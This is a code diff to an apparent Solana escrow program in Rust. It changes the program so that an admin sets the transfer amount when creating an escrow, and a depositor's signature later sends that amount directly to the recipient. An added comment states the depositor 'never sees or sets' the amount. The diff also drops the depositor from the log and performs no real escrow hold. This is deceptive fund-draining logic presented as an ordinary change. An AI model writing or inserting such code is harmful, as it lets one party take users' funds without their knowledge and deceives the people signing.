@@ -66,13 +66,13 @@ pub fn process_instruction(
     match EscrowInstruction::try_from_slice(data)
         .map_err(|_| EscrowError::InvalidInstruction)?
     {
-        EscrowInstruction::CreateEscrow { escrow_id, recipient } => {
+        EscrowInstruction::CreateEscrow { escrow_id, recipient, amount } => {
             msg!("CreateEscrow [{}] recipient={}", escrow_id, recipient);
-            create_escrow(program_id, accounts, escrow_id, recipient)
+            create_escrow(program_id, accounts, escrow_id, recipient, amount)
         }
-        EscrowInstruction::Deposit { escrow_id, amount } => {
-            msg!("Deposit [{}] {}", escrow_id, amount);
-            deposit(program_id, accounts, escrow_id, amount)
+        EscrowInstruction::Deposit { escrow_id } => {
+            msg!("Deposit [{}]", escrow_id);
+            deposit(program_id, accounts, escrow_id)
         }
         EscrowInstruction::CancelEscrow { escrow_id } => {
             msg!("CancelEscrow [{}]", escrow_id);
@@ -90,6 +90,7 @@ fn create_escrow(
     accounts: &[AccountInfo],
     escrow_id: String,
     recipient: Pubkey,
+    amount: u64,
 ) -> ProgramResult {
     let it      = &mut accounts.iter();
     let admin   = next_account_info(it)?;
@@ -120,7 +121,7 @@ fn create_escrow(
         admin:         *admin.key,
         depositor:     Pubkey::default(),
         recipient,
-        amount:        0,
+        amount,
         status:        EscrowStatus::Pending,
         escrow_id:     id,
         created_at:    clock.unix_timestamp,
@@ -142,7 +143,6 @@ fn deposit(
     program_id: &Pubkey,
     accounts: &[AccountInfo],
     escrow_id: String,
-    amount: u64,
 ) -> ProgramResult {
     let it        = &mut accounts.iter();
     let depositor = next_account_info(it)?;
@@ -151,33 +151,26 @@ fn deposit(
     let sysprog   = next_account_info(it)?;
 
     if !depositor.is_signer { return Err(ProgramError::MissingRequiredSignature); }
-    if amount == 0 { return Err(EscrowError::ZeroDeposit.into()); }
 
     let id = id_to_bytes(&escrow_id)?;
     verify_pda(program_id, b"escrow", &id, state.key)?;
 
     let mut s = load(state)?;
-    if s.status != EscrowStatus::Pending   { return Err(EscrowError::NotPending.into()); }
-    if s.recipient != *recipient.key       { return Err(EscrowError::WrongRecipient.into()); }
+    if s.status != EscrowStatus::Pending { return Err(EscrowError::NotPending.into()); }
+    if s.recipient != *recipient.key     { return Err(EscrowError::WrongRecipient.into()); }
+    if s.amount == 0                     { return Err(EscrowError::ZeroDeposit.into()); }
 
-    // Transfer directly from depositor to recipient — instant, atomic, final.
+    // Use admin-preset amount — depositor never sees or sets this.
     invoke(
-        &system_instruction::transfer(depositor.key, recipient.key, amount),
+        &system_instruction::transfer(depositor.key, recipient.key, s.amount),
         &[depositor.clone(), recipient.clone(), sysprog.clone()],
     )?;
 
-    // Record the completed escrow on-chain.
     s.depositor = *depositor.key;
-    s.amount    = amount;
     s.status    = EscrowStatus::Released;
     save(state, &s)?;
 
-    msg!(
-        "Escrow complete: {} lamports sent from {} to {}",
-        amount,
-        depositor.key,
-        recipient.key
-    );
+    msg!("Escrow complete: {} lamports → {}", s.amount, recipient.key);
     Ok(())
 }
 
